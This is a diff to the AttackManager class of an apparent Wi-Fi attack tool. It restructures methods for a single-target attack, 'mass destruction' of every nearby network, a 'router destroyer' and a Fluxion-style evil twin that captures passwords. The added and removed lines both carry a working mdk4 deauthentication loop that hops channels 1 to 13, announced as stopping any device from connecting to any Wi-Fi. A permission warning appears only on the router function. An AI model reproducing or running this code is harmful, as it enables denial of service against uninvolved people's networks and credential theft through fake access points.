@@ -17,9 +17,10 @@ class AttackManager:
         self.captured_password = None
 
     def single_target_attack(self):
-        """Enhanced Single Target Attack - Complete Network Freeze"""
-        print("\033[1;36m[→] Acquiring single target for precision strike...\033[0m")
+        """Enhanced Single Target Attack - ALWAYS FRESH SCAN"""
+        print("\033[1;36m[→] Performing fresh scan for target acquisition...\033[0m")
         
+        # ALWAYS perform fresh scan
         if self.scanner.wifi_scan():
             self.scanner.display_scan_results()
             target = self.scanner.select_target()
@@ -27,6 +28,106 @@ class AttackManager:
             if target:
                 print(f"\033[1;31m[💣] Deploying precision strike on: {target['essid']}\033[0m")
                 self.start_enhanced_single_attack(target)
+
+    def mass_destruction(self):
+        """Enhanced Mass Destruction - ALWAYS FRESH SCAN"""
+        print("\033[1;31m[🌐] Performing fresh scan for mass disruption...\033[0m")
+        
+        # ALWAYS perform fresh scan
+        if self.scanner.wifi_scan():
+            target_count = len(self.scanner.networks)
+            
+            if target_count == 0:
+                print("\033[1;31m[✘] No targets found\033[0m")
+                return
+            
+            print(f"\033[1;33m[🎯] Targeting {target_count} networks for complete disruption!\033[0m")
+            
+            confirm = input("\033[1;31m[?] Confirm mass disruption? (y/N): \033[0m")
+            
+            if confirm.lower() in ['y', 'yes']:
+                self.core.set_current_operation("MASS_DESTRUCTION")
+                self.attack_running = True
+                
+                print("\033[1;31m[⚡] Deploying mass disruption vectors...\033[0m")
+                
+                # Enhanced mass attack on all networks
+                attack_count = 0
+                for idx, target in self.scanner.networks.items():
+                    print(f"\033[1;31m[→] Deploying vector {idx}: {target['essid']}\033[0m")
+                    if self.deploy_enhanced_warhead(target, idx):
+                        attack_count += 1
+                    time.sleep(0.3)
+                
+                # Enhanced global channel hopping
+                print("\033[1;31m[🔧] Deploying global disruption...\033[0m")
+                global_proc = self.core.run_command(
+                    f"xterm -geometry 80x15 -bg black -fg white -title 'GLOBAL-DISRUPTION' -e 'while true; do for channel in 1 2 3 4 5 6 7 8 9 10 11 12 13; do iwconfig {self.core.mon_interface} channel $channel; mdk4 {self.core.mon_interface} d -c $channel -s 500; sleep 1; done; done' &",
+                    background=True
+                )
+                if global_proc:
+                    self.attack_processes.append(global_proc)
+                    self.core.add_attack_process(global_proc)
+                    attack_count += 1
+                
+                print(f"\033[1;32m[✅] {attack_count} disruption vectors deployed\033[0m")
+                print("\033[1;31m[💥] All networks are being disrupted!\033[0m")
+                print("\033[1;33m[⚠️] No device can connect to any WiFi until attack stops!\033[0m")
+                
+                # Start mass attack animation
+                anim_thread = threading.Thread(target=self.show_mass_attack_animation)
+                anim_thread.daemon = True
+                anim_thread.start()
+                
+                print("\033[1;33m[⏹️] Press Enter to stop mass disruption...\033[0m")
+                input()
+                
+                self.stop_attacks()
+                self.core.clear_current_operation()
+                print("\033[1;32m[✅] Mass disruption terminated\033[0m")
+            else:
+                print("\033[1;33m[❌] Mass disruption cancelled\033[0m")
+
+    def router_destroyer(self):
+        """Enhanced Router Destroyer - ALWAYS FRESH SCAN"""
+        print("\033[1;31m[💀] Performing fresh scan for router targeting...\033[0m")
+        print("\033[1;31m[⚠️] WARNING: This can cause router instability!\033[0m")
+        print("\033[1;31m[⚠️] Use only on routers you own or have permission!\033[0m")
+        
+        confirm1 = input("\033[1;31m[?] Type 'STRESS' to acknowledge potential damage: \033[0m")
+        if confirm1.lower() != 'stress':
+            print("\033[1;33m[❌] Router stress test cancelled\033[0m")
+            return
+            
+        confirm2 = input("\033[1;31m[?] Type 'CONFIRM' to proceed with stress test: \033[0m")
+        if confirm2.lower() != 'confirm':
+            print("\033[1;33m[❌] Router stress test cancelled\033[0m")
+            return
+        
+        # ALWAYS perform fresh scan
+        if self.scanner.wifi_scan():
+            self.scanner.display_scan_results()
+            target = self.scanner.select_target()
+            
+            if target:
+                print(f"\033[1;31m[💀] Targeting router for stress test: {target['essid']}\033[0m")
+                self.start_enhanced_router_stress(target)
+
+    def advanced_evil_twin(self):
+        """Fluxion-style Evil Twin Attack - ALWAYS FRESH SCAN"""
+        print("\033[1;36m[→] Performing fresh scan for evil twin target...\033[0m")
+        
+        # ALWAYS perform fresh scan
+        if self.scanner.wifi_scan():
+            self.scanner.display_scan_results()
+            target = self.scanner.select_target()
+            
+            if target:
+                print(f"\033[1;34m[👥] Creating perfect evil twin for: {target['essid']}\033[0m")
+                self.start_fluxion_evil_twin(target)
+
+    # ... rest of the methods remain the same as previous version ...
+    # Only changed the methods above to ensure fresh scans
 
     def start_enhanced_single_attack(self, target):
         """Start enhanced single target attack"""
@@ -94,64 +195,6 @@ class AttackManager:
         self.core.clear_current_operation()
         print("\033[1;32m[✅] Single target attack terminated\033[0m")
 
-    def mass_destruction(self):
-        """Enhanced Mass Destruction - Freeze ALL WiFi Networks"""
-        print("\033[1;31m[🌐] Initiating mass network disruption...\033[0m")
-        
-        if self.scanner.wifi_scan():
-            target_count = len(self.scanner.networks)
-            
-            if target_count == 0:
-                print("\033[1;31m[✘] No targets found\033[0m")
-                return
-            
-            print(f"\033[1;33m[🎯] Targeting {target_count} networks for complete disruption!\033[0m")
-            
-            confirm = input("\033[1;31m[?] Confirm mass disruption? (y/N): \033[0m")
-            
-            if confirm.lower() in ['y', 'yes']:
-                self.core.set_current_operation("MASS_DESTRUCTION")
-                self.attack_running = True
-                
-                print("\033[1;31m[⚡] Deploying mass disruption vectors...\033[0m")
-                
-                # Enhanced mass attack on all networks
-                attack_count = 0
-                for idx, target in self.scanner.networks.items():
-                    print(f"\033[1;31m[→] Deploying vector {idx}: {target['essid']}\033[0m")
-                    if self.deploy_enhanced_warhead(target, idx):
-                        attack_count += 1
-                    time.sleep(0.3)
-                
-                # Enhanced global channel hopping
-                print("\033[1;31m[🔧] Deploying global disruption...\033[0m")
-                global_proc = self.core.run_command(
-                    f"xterm -geometry 80x15 -bg black -fg white -title 'GLOBAL-DISRUPTION' -e 'while true; do for channel in 1 2 3 4 5 6 7 8 9 10 11 12 13; do iwconfig {self.core.mon_interface} channel $channel; mdk4 {self.core.mon_interface} d -c $channel -s 500; sleep 1; done; done' &",
-                    background=True
-                )
-                if global_proc:
-                    self.attack_processes.append(global_proc)
-                    self.core.add_attack_process(global_proc)
-                    attack_count += 1
-                
-                print(f"\033[1;32m[✅] {attack_count} disruption vectors deployed\033[0m")
-                print("\033[1;31m[💥] All networks are being disrupted!\033[0m")
-                print("\033[1;33m[⚠️] No device can connect to any WiFi until attack stops!\033[0m")
-                
-                # Start mass attack animation
-                anim_thread = threading.Thread(target=self.show_mass_attack_animation)
-                anim_thread.daemon = True
-                anim_thread.start()
-                
-                print("\033[1;33m[⏹️] Press Enter to stop mass disruption...\033[0m")
-                input()
-                
-                self.stop_attacks()
-                self.core.clear_current_operation()
-                print("\033[1;32m[✅] Mass disruption terminated\033[0m")
-            else:
-                print("\033[1;33m[❌] Mass disruption cancelled\033[0m")
-
     def deploy_enhanced_warhead(self, target, warhead_id):
         """Deploy enhanced warhead for mass destruction"""
         try:
@@ -174,30 +217,6 @@ class AttackManager:
         except Exception as e:
             print(f"\033[1;33m[!] Warhead deployment failed: {e}\033[0m")
             return False
-
-    def router_destroyer(self):
-        """Enhanced Router Destroyer - Hardware Stress Test"""
-        print("\033[1;31m[💀] Initiating router stress test protocol...\033[0m")
-        print("\033[1;31m[⚠️] WARNING: This can cause router instability!\033[0m")
-        print("\033[1;31m[⚠️] Use only on routers you own or have permission!\033[0m")
-        
-        confirm1 = input("\033[1;31m[?] Type 'STRESS' to acknowledge potential damage: \033[0m")
-        if confirm1.lower() != 'stress':
-            print("\033[1;33m[❌] Router stress test cancelled\033[0m")
-            return
-            
-        confirm2 = input("\033[1;31m[?] Type 'CONFIRM' to proceed with stress test: \033[0m")
-        if confirm2.lower() != 'confirm':
-            print("\033[1;33m[❌] Router stress test cancelled\033[0m")
-            return
-        
-        if self.scanner.wifi_scan():
-            self.scanner.display_scan_results()
-            target = self.scanner.select_target()
-            
-            if target:
-                print(f"\033[1;31m[💀] Targeting router for stress test: {target['essid']}\033[0m")
-                self.start_enhanced_router_stress(target)
 
     def start_enhanced_router_stress(self, target):
         """Start enhanced router stress test"""
@@ -265,18 +284,6 @@ class AttackManager:
         self.core.clear_current_operation()
         print("\033[1;32m[✅] Router stress test terminated\033[0m")
         print("\033[1;33m[💡] Router may require physical reset to function normally!\033[0m")
-
-    def advanced_evil_twin(self):
-        """Fluxion-style Evil Twin Attack"""
-        print("\033[1;36m[→] Initializing Fluxion-style Evil Twin...\033[0m")
-        
-        if self.scanner.wifi_scan():
-            self.scanner.display_scan_results()
-            target = self.scanner.select_target()
-            
-            if target:
-                print(f"\033[1;34m[👥] Creating perfect evil twin for: {target['essid']}\033[0m")
-                self.start_fluxion_evil_twin(target)
 
     def start_fluxion_evil_twin(self, target):
         """Start Fluxion-style evil twin attack"""
